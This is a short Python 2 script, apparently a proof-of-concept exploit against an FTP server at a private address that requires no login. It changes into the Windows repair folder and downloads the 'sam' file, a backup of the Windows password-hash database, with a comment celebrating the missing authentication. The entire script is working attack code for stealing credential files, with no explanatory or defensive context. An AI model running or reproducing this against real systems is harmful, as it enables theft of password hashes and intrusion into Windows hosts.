import ftplib
import os
 
# Connect to server
 
ftp = ftplib.FTP( "192.168.58.135" )
ftp.set_pasv( False )
 
# Note that we need no authentication at all!!
 
print ftp.sendcmd( 'CWD C:\\\\windows\\\\repair\\\\' )
print ftp.retrbinary('RETR sam', open('sam', 'wb').write )
 
ftp.quit()
